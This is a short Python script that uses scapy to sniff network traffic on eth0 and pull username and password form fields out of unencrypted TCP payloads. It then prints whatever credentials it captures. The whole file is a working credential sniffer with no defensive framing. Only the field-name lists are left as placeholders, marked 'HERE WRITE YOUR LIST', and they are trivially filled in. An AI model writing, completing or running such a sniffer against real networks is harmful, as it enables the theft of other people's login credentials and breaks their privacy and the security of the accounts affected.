from scapy.all import *

from urllib import parse

import re

iface = "eth0"

def login_pass(body):

    user = None
    passwd = None
    userfields = ["HERE WRITE YOUR LIST"]
    passfields = ["HERE WRITE YOUR LIST"]

    for login in userfields:

        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)

        if login_re:

            user = login_re.group()

    for passfield in passfields:

        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)

        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return(user,passwd)

def pkt_parser(packet):

    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        userpass=login_pass(body)
        #print(packet[TCP].payload)
        if userpass != None:
            print(packet[TCP].payload)
            print(parse.unquote(userpass[0]))
            print(parse.unquote(userpass[1]))

    else: 
        pass


try: 
    
    sniff(iface=iface,prn=pkt_parser,store=0)

except KeyboardInterrupt:
    
    print("Exiting.")
    exit(0)